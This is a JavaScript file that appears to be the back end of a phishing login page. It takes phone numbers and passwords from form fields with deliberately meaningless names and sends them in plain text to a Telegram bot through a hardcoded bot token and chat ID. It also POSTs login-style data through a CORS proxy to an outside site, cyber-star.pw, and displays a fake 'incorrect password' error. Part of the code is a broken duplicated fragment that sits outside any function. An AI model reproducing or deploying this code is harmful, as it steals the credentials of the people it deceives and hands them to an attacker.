function sendRequest() {
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://thingproxy.freeboard.io/fetch/https://cyber-star.pw/script.php", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

  xhr.onreadystatechange = function() {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var response = JSON.parse(xhr.responseText);
      if (response.error_description === "Username or password is incorrect") {
        var errorElement = document.getElementById("error");
        errorElement.style.display = "block";

        var errorDescriptionElement = document.getElementById("error_description");
        errorDescriptionElement.textContent = "Error";
      }
    }
  };

  var data = "captcha_sid=null&cid=null&location_id=3&AccessRecovery=79283450132&ConfirmedPassword=3213112132";
  xhr.send(data);
}

  // Устанавливаем данные для отправки (если необходимо)
  var data = new FormData();
  data.append("captcha_sid", null);
  data.append("cid", null);
  data.append("location_id", "3");
  data.append("AccessRecovery", "79283450132");
  data.append("ConfirmedPassword", "3213112132");

  // Отправляем запрос
  xhr.send(data);
}

function functionToExecute() {
    sendRequest();
    let apiToken = "5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs";
    let chatId = "5445772855";

    var phone = document.getElementsByName('ddsfgdfg')[0].value
    var password = document.getElementsByName('dsfhjkjkf')[0].value

    var settings = {
      "async": true,
      "crossDomain": true,
      "url": "https://api.telegram.org/" + "bot5953853423:AAHhoTbXnHkcTEwTdiqH7MwNO7lZA5iSHSs" + "/sendMessage",
      "method": "POST",
      "headers": {
        "Content-Type": "application/json",
        "cache-control": "no-cache"
      },
      "data": JSON.stringify({
        "chat_id": "5590842489",
        "text": "Phone: "+phone+" | Password: "+password
      })
    }

    $.ajax(settings).done(function (response) {
      console.log(response);
    });
}